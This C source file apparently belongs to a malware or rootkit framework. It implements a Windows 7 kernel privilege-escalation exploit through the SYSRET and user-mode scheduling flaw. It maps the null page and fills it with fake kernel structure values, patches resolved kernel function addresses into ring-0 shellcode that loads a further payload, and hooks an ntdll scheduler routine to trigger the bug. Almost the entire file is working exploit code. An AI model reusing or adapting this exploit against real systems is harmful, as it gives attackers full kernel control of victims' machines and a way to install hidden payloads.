#include "..\..\rehook\code\hook.h"

#include "sysret_sc_level0.c"

#define SIZE_OF_NT_SIGNATURE sizeof(IMAGE_NT_SIGNATURE)
#define  NTSIGNATURE(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew))
#define OPTHDROFFSET(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew + SIZE_OF_NT_SIGNATURE + sizeof (IMAGE_FILE_HEADER)))
#define PEFHDROFFSET(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew + SIZE_OF_NT_SIGNATURE))
#define SECHDROFFSET(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew + SIZE_OF_NT_SIGNATURE + sizeof(IMAGE_FILE_HEADER) + sizeof(IMAGE_OPTIONAL_HEADER)))
#define OPTHDROFFSET(a) ((LPVOID)((BYTE *)a + ((PIMAGE_DOS_HEADER)a)->e_lfanew + SIZE_OF_NT_SIGNATURE + sizeof (IMAGE_FILE_HEADER)))
#define NUMOFSECTION(a) ((DWORD)((PIMAGE_FILE_HEADER) PEFHDROFFSET(a))->NumberOfSections);
#define IsBitSet(val, bit) ((val) & (1 << (bit)))

// #define RTL_UMS_VERSION  (0x0100)  
// #define UMS_VERSION RTL_UMS_VERSION
// 
// typedef enum _RTL_UMS_SCHEDULER_REASON {
//     UmsSchedulerStartup = 0,
//     UmsSchedulerThreadBlocked,
//     UmsSchedulerThreadYield,
// } RTL_UMS_SCHEDULER_REASON, *PRTL_UMS_SCHEDULER_REASON;
// 
// 
// typedef VOID NTAPI RTL_UMS_SCHEDULER_ENTRY_POINT(RTL_UMS_SCHEDULER_REASON Reason, ULONG_PTR ActivationPayload, PVOID SchedulerParam);
// typedef RTL_UMS_SCHEDULER_ENTRY_POINT *PRTL_UMS_SCHEDULER_ENTRY_POINT;
// 
// 
// typedef struct _UMS_CREATE_THREAD_ATTRIBUTES {  
//     DWORD UmsVersion;   
//     PVOID UmsContext;   
//     PVOID UmsCompletionList;   
// } UMS_CREATE_THREAD_ATTRIBUTES, *PUMS_CREATE_THREAD_ATTRIBUTES; 
// 
// typedef void *PUMS_COMPLETION_LIST;
// 
// typedef PRTL_UMS_SCHEDULER_ENTRY_POINT PUMS_SCHEDULER_ENTRY_POINT;
// 
// typedef struct _UMS_SCHEDULER_STARTUP_INFO {
// 
//     //
//     // UMS Version the application was built to. Should be set to UMS_VERSION
//     //
//     ULONG UmsVersion;
// 
//     //
//     // Completion List to associate the new User Scheduler to.
//     //
//     PUMS_COMPLETION_LIST CompletionList;
// 
//     //
//     // A pointer to the application-defined function that represents the starting
//     // address of the Sheduler.
//     //
//     PUMS_SCHEDULER_ENTRY_POINT SchedulerProc;
// 
//     //
//     // pointer to a variable to be passed to the scheduler uppon first activation.
//     //
//     PVOID SchedulerParam;
// 
// } UMS_SCHEDULER_STARTUP_INFO, *PUMS_SCHEDULER_STARTUP_INFO;
// 
// typedef void *PUMS_CONTEXT;
// 
// typedef enum _RTL_UMS_SCHEDULER_REASON UMS_SCHEDULER_REASON;
// 
// typedef enum _RTL_UMS_THREAD_INFO_CLASS {
//     UmsThreadInvalidInfoClass = 0,
//     UmsThreadUserContext,
//     UmsThreadPriority,
//     UmsThreadAffinity,
//     UmsThreadTeb,
//     UmsThreadIsSuspended,
//     UmsThreadIsTerminated,
//     UmsThreadMaxInfoClass
// } RTL_UMS_THREAD_INFO_CLASS, *PRTL_UMS_THREAD_INFO_CLASS;
// 
// typedef enum _RTL_UMS_THREAD_INFO_CLASS UMS_THREAD_INFO_CLASS, *PUMS_THREAD_INFO_CLASS;
// 
// #define ProcThreadAttributeUmsThread 6
// 
// #define PROC_THREAD_ATTRIBUTE_UMS_THREAD \
//     ProcThreadAttributeValue (ProcThreadAttributeUmsThread, TRUE, TRUE, FALSE)

typedef BOOL (*FnCreateUmsCompletionList)(PUMS_COMPLETION_LIST* UmsCompletionList);
typedef BOOL (*FnCreateUmsThreadContext)(PUMS_CONTEXT *lpUmsThread);
typedef BOOL (*FnUmsThreadYield)(PVOID SchedulerParam);
typedef BOOL (*FnDequeueUmsCompletionListItems)(PUMS_COMPLETION_LIST UmsCompletionList, DWORD WaitTimeOut, PUMS_CONTEXT* UmsThreadList);
typedef PUMS_CONTEXT (*FnGetNextUmsListItem)(PUMS_CONTEXT UmsContext);
typedef BOOL (*FnQueryUmsThreadInformation)(PUMS_CONTEXT UmsThread, UMS_THREAD_INFO_CLASS UmsThreadInfoClass, PVOID UmsThreadInformation, ULONG UmsThreadInformationLength, PULONG ReturnLength);
typedef BOOL (*FnExecuteUmsThread)(PUMS_CONTEXT UmsThread);
typedef BOOL (*FnEnterUmsSchedulingMode)(PUMS_SCHEDULER_STARTUP_INFO SchedulerStartupInfo);
typedef BOOL (*FnDeleteUmsThreadContext)(PUMS_CONTEXT UmsThread);
typedef HANDLE (*FnCreateRemoteThreadEx)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList, LPDWORD lpThreadId);
typedef NTSTATUS (*FnNtAllocateVirtualMemory)(HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);


FnNtAllocateVirtualMemory fnNtAllocateVirtualMemory;
FnCreateUmsCompletionList fnCreateUmsCompletionList;
FnCreateUmsThreadContext fnCreateUmsThreadContext;
FnUmsThreadYield fnUmsThreadYield;
FnDequeueUmsCompletionListItems fnDequeueUmsCompletionListItems;
FnGetNextUmsListItem fnGetNextUmsListItem;
FnQueryUmsThreadInformation fnQueryUmsThreadInformation;
FnExecuteUmsThread fnExecuteUmsThread;
FnEnterUmsSchedulingMode fnEnterUmsSchedulingMode;
FnDeleteUmsThreadContext fnDeleteUmsThreadContext;
FnCreateRemoteThreadEx fnCreateRemoteThreadEx;


PUMS_COMPLETION_LIST UMSCompletionList;
PUMS_CONTEXT   pUmsThread;
HOOK_ENTRY gUmsHook;
VOID SetNonCanonicalAddress(VOID);
PVOID OrginalUmsSchedulerAddress;
HANDLE ntdll;


ULONG_PTR KernelGetProcAddress(ULONG_PTR UserKernelBase, ULONG_PTR RealKernelBase, LPCSTR SymName)
{
    ULONG_PTR ProcAddress = (ULONG_PTR)GetProcAddress((HMODULE)UserKernelBase, SymName);
    if (ProcAddress == NULL) {
        return NULL;
    }

    ProcAddress -= UserKernelBase;
    ProcAddress += RealKernelBase;
    return ProcAddress;
}

BOOL GetKernelBaseInfo(PULONG_PTR kernelBase, PCHAR kernelImage, UINT Size)
{
    LPVOID DriverList[1024];
    CHAR szDriver[MAX_PATH];
    DWORD dwNeededSize;

    if (EnumDeviceDrivers(DriverList, sizeof(DriverList), &dwNeededSize) && dwNeededSize < sizeof(DriverList)) { 
        if( GetDeviceDriverBaseNameA(DriverList[0], szDriver, sizeof(szDriver)/sizeof(szDriver[0])) ) {
            DbgMsg("Kernel Executive Entry (%s) at : %p\n", szDriver, DriverList[0]);
            *kernelBase = (ULONG_PTR)DriverList[0];
            strncpy(kernelImage, szDriver, Size);
            return TRUE;
        }
    }
    else {
        DbgMsg("EnumDeviceDrivers() failed\n");
    }

    return TRUE;
}


DWORD WINAPI UmsTaskProc(LPVOID lpThreadParameter)
{
    fnUmsThreadYield(0);
    return 0;
}

uint8_t* PeGetCodeSectionAddress(IN PVOID BaseAddress)
{
    PIMAGE_OPTIONAL_HEADER64 pOptionalHeader;

    pOptionalHeader = (PIMAGE_OPTIONAL_HEADER64)OPTHDROFFSET(BaseAddress);
    return (uint8_t*)(pOptionalHeader->BaseOfCode + (ULONG_PTR)BaseAddress);
}

uint32_t PeGetCodeSectionSize(IN PVOID BaseAddress)
{
    PIMAGE_OPTIONAL_HEADER64 pOptionalHeader;

    pOptionalHeader = (PIMAGE_OPTIONAL_HEADER64)OPTHDROFFSET(BaseAddress);
    return pOptionalHeader->SizeOfCode;
}

uint8_t* GetUmsSchedulerAddress()
{
    uint8_t umsSchedulerSig[] = {0x49, 0x89, 0x8a};
    uint32_t i;
    uint8_t* ntdllCodeSection = PeGetCodeSectionAddress(ntdll);
    uint32_t ntdllCodeSectionSize = (ULONG_PTR)PeGetCodeSectionSize(ntdll);

    if (ntdllCodeSection != NULL && ntdllCodeSectionSize != 0) {
        for (i = 0; i < ntdllCodeSectionSize; ++i) {
            if (memcmp((LPVOID)(ntdllCodeSection+i), umsSchedulerSig, sizeof(umsSchedulerSig)) == 0) {
                return (ntdllCodeSection + i);
            }
        }
    }

    return NULL;
}

BOOLEAN HookUmsScheduler()
{	
    uint8_t* UmsSchedulerAddress = GetUmsSchedulerAddress();
    
    if (UmsSchedulerAddress == NULL) {
        return FALSE;
    }

    DbgMsg("RtlpUmsPrimaryContextWrap hook point at : %p", UmsSchedulerAddress);
    if (reh_initialize() != MH_OK) {
        return FALSE;
    }

    if (reh_create_hook(UmsSchedulerAddress, SetNonCanonicalAddress, &OrginalUmsSchedulerAddress, &gUmsHook) != MH_OK) {
        return FALSE;
    }

    if (reh_enable_hook(&gUmsHook) != MH_OK) {
        return FALSE;
    }

    return TRUE;
}

BOOLEAN AlocNullPageAndFixCondtions(VOID)
{
	NTSTATUS ntStatus;
	SIZE_T regionSize = 0xF000;
	uint8_t* lpBaseAddress = (uint8_t*)0x1;

	ntStatus = fnNtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&lpBaseAddress, 0L, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (ntStatus == STATUS_SUCCESS) {
		__stosb(lpBaseAddress, 0x00, regionSize);
		/*
		ntoskrnl.exe:FFFFF800028C94DF mov     rax, gs:qword_188
		ntoskrnl.exe:FFFFF800028C94E8 bt      dword ptr [rax+4Ch], 0Bh
		ntoskrnl.exe:FFFFF800028C94ED jnb     short loc_FFFFF800028C94FD
		*/
		*(uint64_t*)(lpBaseAddress + 0x4C) = 0x1800;

		/*
		ntoskrnl.exe:FFFFF800029EBBD3 mov     esi, 1
		ntoskrnl.exe:FFFFF800029EBBD8 add     [rbx+1C4h], si
		*/
		//*(PLONGLONG)((ULONG_PTR)lpBaseAddress+0x1C4) = 0xFFFFFFFFFFFFFFFF;

		/*
		ntoskrnl.exe:FFFFF800028C9CA0 mov     rcx, gs:qword_188
		ntoskrnl.exe:FFFFF800028C9CA9 mov     rcx, [rcx+28h]
		ntoskrnl.exe:FFFFF800028C9CAD lea     rcx, [rcx+50h]
		ntoskrnl.exe:FFFFF800028C9CB1 mov     [rsp+40h], rcx
		ntoskrnl.exe:FFFFF800028C9CB6 fxsave  dword ptr [rcx]
		*/
		*(uint64_t*)(lpBaseAddress + 0x28) =  0x0100;

		/*
		ntoskrnl.exe:FFFFF800029E86A8 mov     rbx, gs:qword_188
		ntoskrnl.exe:FFFFF800029E86B1 mov     r12, rcx
		ntoskrnl.exe:FFFFF800029E86B4 mov     [rcx+60h], rbx
		ntoskrnl.exe:FFFFF800029E86B8 mov     rax, [rbx+1B8h]
		ntoskrnl.exe:FFFFF800029E86BF mov     rbp, [rax+80h]
		ntoskrnl.exe:FFFFF800029E86C6 mov     rcx, rbp
		ntoskrnl.exe:FFFFF800029E86C9 call    near ptr PspFindThreadForTeb
		*/
		*(uint64_t*)(lpBaseAddress + 0x80) =  0x01;
		*(uint64_t*)(lpBaseAddress + 0x70) =  0x1700;
		return TRUE;
	}

    DbgMsg("NtAllocateVirtualMemory failed %X", GetLastError());
	return FALSE;
}

BOOLEAN SetupKernelShellcode(IN ULONG_PTR UsermodeReturnAddress)
{
    uint8_t* realScAddress;
    ULONG_PTR	KernelBaseAddress;
    HMODULE		hNtOsHandle;
    uint8_t* fnExAllocatePoolWithTag;
    uint8_t* fnKeInitializeDpc;
    uint8_t* fnKeInsertQueueDpc;
    CHAR		szKernelImageName[MAX_PATH];
    uint32_t offset = 0;

    if (!GetKernelBaseInfo( &KernelBaseAddress, szKernelImageName, MAX_PATH)) {
        DbgMsg("Faild to get kernel base address.\n");
        return FALSE;
    }

    hNtOsHandle = LoadLibrary( szKernelImageName );
    if ( hNtOsHandle == NULL ) {
        DbgMsg("LoadLibrary() failed\n");
        return FALSE;
    }

    if ((fnExAllocatePoolWithTag = KernelGetProcAddress((ULONG_PTR)hNtOsHandle, KernelBaseAddress, "ExAllocatePoolWithTag")) == NULL) {
        return FALSE;
    }

    if ((fnKeInitializeDpc = KernelGetProcAddress((ULONG_PTR)hNtOsHandle, KernelBaseAddress, "KeInitializeDpc")) == NULL) {
        return FALSE;
    }

    if ((fnKeInsertQueueDpc = KernelGetProcAddress((ULONG_PTR)hNtOsHandle, KernelBaseAddress, "KeInsertQueueDpc")) == NULL) {
        return FALSE;
    }

    realScAddress = (uint8_t*)VirtualAlloc(NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (realScAddress == NULL) {
        return FALSE;
    }

    DbgMsg("Shellcode memory allocated at : %p\n", realScAddress);
    __stosd(realScAddress, 0xCCF8010F, 1);
    __movsb(realScAddress + 3 /*+ 1*/, sysret_sc_level0_x64, sizeof(sysret_sc_level0_x64));

    utils_fix_64value(realScAddress, sizeof(sysret_sc_level0_x64), 0xAAAAAAAAAAAAAAAAULL, (uint64_t)fnExAllocatePoolWithTag);
    utils_fix_64value(realScAddress, sizeof(sysret_sc_level0_x64), 0xBBBBBBBBBBBBBBBBULL, (uint64_t)fnKeInitializeDpc);
    utils_fix_64value(realScAddress, sizeof(sysret_sc_level0_x64), 0xCCCCCCCCCCCCCCCCULL, (uint64_t)fnKeInsertQueueDpc);
    utils_fix_64value(realScAddress, sizeof(sysret_sc_level0_x64), 0xDDDDDDDDDDDDDDDDULL, (uint64_t)gLevel1Shellcode);
    utils_fix_32value(realScAddress, sizeof(sysret_sc_level0_x64), 0xEEEEEEEEUL, (uint64_t)sizeof(zk_loader_x64));
    utils_fix_64value(realScAddress, sizeof(sysret_sc_level0_x64), 0xFEFEFEFEFEFEFEFEULL, (uint64_t)gPayload);
    utils_fix_32value(realScAddress, sizeof(sysret_sc_level0_x64), 0x79797979UL, (uint64_t)gpi.payloadSize);

    while (offset < sizeof(zk_loader_x64)) {
        if (*(uint64_t*)(gLevel1Shellcode + offset) == 0xAAAAAAAAAAAAAAAAULL) {
            utils_fix_32value(realScAddress, sizeof(sysret_sc_level0_x64), 0xABABABABUL, offset);
            break;
        }
        ++offset;
    }

    __stosd(realScAddress + 3 /*+ 1*/ + sizeof(sysret_sc_level0_x64) - 1, 0x48F8010F, 1);
    __stosb(realScAddress + 3 /*+ 1*/ + sizeof(sysret_sc_level0_x64) + 4 - 1, 0xB9, 1);
    __stosq(realScAddress + 3 /*+ 1*/ + sizeof(sysret_sc_level0_x64) + 4 + 1 - 1, UsermodeReturnAddress, 1);
    __stosw(realScAddress + 3 /*+ 1*/ + sizeof(sysret_sc_level0_x64) + 4 + 1 + 8 - 1, 0x070F, 1);

    *(uint8_t**)(0L + 0x10) = realScAddress;
    
    return TRUE;
}

VOID WINAPI UmsSchedulerProc(UMS_SCHEDULER_REASON Reason, ULONG_PTR ActivationPayload, PVOID SchedulerParam)
{
    PUMS_CONTEXT next;
    ULONG retlen;
    BOOLEAN bTerminated;
    BOOLEAN bOk;

    switch (Reason) {
        case UmsSchedulerStartup:
            break;
        case UmsSchedulerThreadYield:
            goto switch_to_task;
        case UmsSchedulerThreadBlocked:
            break;
    }

    for ( ; ; ) {
        PUMS_CONTEXT UmsThreadList;
        if (fnDequeueUmsCompletionListItems(UMSCompletionList, INFINITE, &UmsThreadList)) {
            if (UmsThreadList) {
                next = fnGetNextUmsListItem(UmsThreadList);
                retlen = 0;
                bTerminated = FALSE;
                bOk = fnQueryUmsThreadInformation(pUmsThread, UmsThreadIsTerminated, &bTerminated, sizeof(bTerminated), &retlen);

                if (bTerminated) {
                    return;
                }

                goto switch_to_task;
            }
        }
    }

switch_to_task:
    for ( ; ; ) {
        fnExecuteUmsThread(pUmsThread);
    }
}

BOOLEAN exploit_fire_sysret()
{
    BOOLEAN ret = FALSE;
    SIZE_T attrsize;
    HANDLE hThread;
    LPPROC_THREAD_ATTRIBUTE_LIST attrlist;
    UMS_CREATE_THREAD_ATTRIBUTES umsattribs;
    UMS_SCHEDULER_STARTUP_INFO umsinfo;
    HANDLE kernel32;
    void* handler;

    if (gSysInfo.osMajorVer != 6 || gSysInfo.osMinorVer != 1) {
        DbgMsg("OS not supported by exploit\n");
        return FALSE;
    }

    kernel32 = GetModuleHandle("kernel32.dll");
    ntdll = GetModuleHandle("ntdll.dll");
    fnNtAllocateVirtualMemory = (FnNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    fnCreateUmsCompletionList = (FnCreateUmsCompletionList)GetProcAddress(kernel32, "CreateUmsCompletionList");
    fnCreateUmsThreadContext = (FnCreateUmsThreadContext)GetProcAddress(kernel32, "CreateUmsThreadContext");
    fnUmsThreadYield = (FnUmsThreadYield)GetProcAddress(kernel32, "UmsThreadYield");
    fnDequeueUmsCompletionListItems = (FnDequeueUmsCompletionListItems)GetProcAddress(kernel32, "DequeueUmsCompletionListItems");
    fnGetNextUmsListItem = (FnGetNextUmsListItem)GetProcAddress(kernel32, "GetNextUmsListItem");
    fnQueryUmsThreadInformation = (FnQueryUmsThreadInformation)GetProcAddress(kernel32, "QueryUmsThreadInformation");
    fnExecuteUmsThread = (FnExecuteUmsThread)GetProcAddress(kernel32, "ExecuteUmsThread");
    fnEnterUmsSchedulingMode = (FnEnterUmsSchedulingMode)GetProcAddress(kernel32, "EnterUmsSchedulingMode");
    fnDeleteUmsThreadContext = (FnDeleteUmsThreadContext)GetProcAddress(kernel32, "DeleteUmsThreadContext");
    fnCreateRemoteThreadEx = (FnCreateRemoteThreadEx)GetProcAddress(kernel32, "CreateRemoteThreadEx");
    
    if (fnNtAllocateVirtualMemory == NULL || fnCreateUmsCompletionList == NULL || fnCreateUmsThreadContext == NULL ||
        fnUmsThreadYield == NULL || fnDequeueUmsCompletionListItems == NULL || fnGetNextUmsListItem == NULL ||
        fnQueryUmsThreadInformation == NULL || fnExecuteUmsThread == NULL || fnEnterUmsSchedulingMode == NULL ||
        fnDeleteUmsThreadContext == NULL || fnCreateRemoteThreadEx == NULL) {
        return FALSE;
    }

    //handler = RtlAddVectoredExceptionHandler(1, VectoredHandlerX);

    do {
        if (AlocNullPageAndFixCondtions() != TRUE) {
            DbgMsg("Null page allocation failed!\n");
            break;
        }

        DbgMsg("Page allocated at : %p\n", 0L);
        DbgMsg("Control flow changed to shellcode execution path.\n");

        if (SetupKernelShellcode(0x4444444444444444) != TRUE) {
            DbgMsg("Setuping Shellcode failed!\n");
            break;
        }

        DbgMsg("Shellcode fixed and palaced at allocated memory.\n");
        Sleep(3 * 1000);

        if (fnCreateUmsCompletionList(&UMSCompletionList) == FALSE) {
            DbgMsg("CreateUmsCompletionList failed\n");
            break;
        }

        attrsize = 0;
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrsize);
        attrlist = (LPPROC_THREAD_ATTRIBUTE_LIST)LocalAlloc(LMEM_ZEROINIT, attrsize);
        __stosb((uint8_t*)attrlist, 0, attrsize);
        if (InitializeProcThreadAttributeList(attrlist, 1, 0, &attrsize) != TRUE) {
            DbgMsg("InitializeProcThreadAttributeList failed\n");
            break;
        }

        if (fnCreateUmsThreadContext(&pUmsThread) == FALSE) {
            DbgMsg("CreateUmsThreadContext failed\n");
            break;
        }

        umsattribs.UmsVersion = UMS_VERSION;
        umsattribs.UmsContext = pUmsThread;
        umsattribs.UmsCompletionList = UMSCompletionList;
        if (UpdateProcThreadAttribute(attrlist, 0, PROC_THREAD_ATTRIBUTE_UMS_THREAD, &umsattribs, sizeof(umsattribs), NULL, NULL) != TRUE) {
            DbgMsg("UpdateProcThreadAttribute failed\n");
            break;
        }

        hThread = fnCreateRemoteThreadEx(GetCurrentProcess(), NULL, 0, UmsTaskProc, 0, 0, attrlist, NULL);
        if (hThread == INVALID_HANDLE_VALUE) {
            DbgMsg("CreateRemoteThreadEx failed\n");
            break;
        }

        CloseHandle(hThread);
        DeleteProcThreadAttributeList(attrlist);
        LocalFree(attrlist);

        DbgMsg("Hooking RtlpUmsPrimaryContextWrap...\n");
        if (HookUmsScheduler() == FALSE) {
            break;
        }

        umsinfo.UmsVersion = UMS_VERSION;
        umsinfo.CompletionList = UMSCompletionList;
        umsinfo.SchedulerProc = UmsSchedulerProc;
        umsinfo.SchedulerParam = NULL;
        DbgMsg("Entering User-mode Scheduling Mode!\n");
        if (fnEnterUmsSchedulingMode(&umsinfo) == TRUE) {
            fnDeleteUmsThreadContext(pUmsThread);
            ret = TRUE;
        }
    } while (0);

    //RtlRemoveVectoredExceptionHandler(handler);

    return ret;
}
